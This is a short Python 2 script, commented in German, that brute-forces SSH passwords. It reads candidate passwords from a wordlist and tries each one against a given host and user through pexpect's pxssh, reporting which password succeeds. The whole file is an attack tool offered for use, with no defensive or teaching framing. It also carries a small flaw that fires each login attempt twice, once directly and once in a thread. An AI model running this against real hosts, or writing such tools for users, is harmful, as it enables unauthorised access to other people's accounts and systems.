####
# Requirements
# sudo easy_install pexpect
#
####
from pexpect import pxssh
import sys
import thread


# Definieren der Funktion
def connect (host,user, password):
    try:
        con = pxssh.pxssh()
        con.login (host, user, password)
        #txt = con.after
        con.logout()
        print password[:-1], " --- Password correct"
        return 0
    except pxssh.ExceptionPxssh, e:
        print password[:-1] + " --- Password incorrect"
        return 1

# Uebergabe der Kommandozeilenparameter an die Funktion
host = sys.argv[1]
user = sys.argv[2]
passfile = sys.argv[3]

# Auslesen der Passwort-Datei
try:
    f = open (passfile)
    password = True
    while password:
        password = f.readline()
        a = connect (host, user, password)
        thread.start_new_thread(connect, (host,user, password))
        if a == 0:
            password = False
        else:
            password = True
except:
    print "Could not open file"

f.close()


#b = True
#while b:
#    a = connect (host, user, password)
#    if a == 0:
#        b = False
#    else:
#        b = True
